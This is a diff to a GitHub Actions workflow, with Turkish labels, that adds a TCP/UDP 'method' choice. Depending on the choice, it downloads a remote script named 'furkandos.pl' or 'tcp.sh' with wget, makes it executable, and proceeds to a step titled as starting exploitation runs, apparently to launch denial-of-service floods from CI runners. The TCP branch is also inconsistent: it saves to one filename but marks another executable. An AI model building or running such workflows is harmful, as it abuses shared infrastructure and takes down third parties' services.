@@ -12,6 +12,9 @@ on:
       time:
         description: "Duration"
         required: true
+      method:
+        description: "Method"
+        required: true
 
 jobs:
   vds:
@@ -24,7 +27,21 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/cGafaK5Qgf/furkandos.pl -O a
+          METHOD="${{ inputs.method }}"
+
+          if [ "$METHOD" = "tcp" ]; then
+            echo "TCP methodu indiriliyor..."
+            wget https://example.com/methods/tcp.sh -O method.sh
+
+          elif [ "$METHOD" = "udp" ]; then
+            echo "UDP methodu indiriliyor..."
+            wget https://wgetz.com/coSOIi4Jg2/furkandos.pl -O a
+
+          else
+            echo "Geçersiz method: $METHOD"
+            exit 1
+          fi
+
           chmod +x a
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
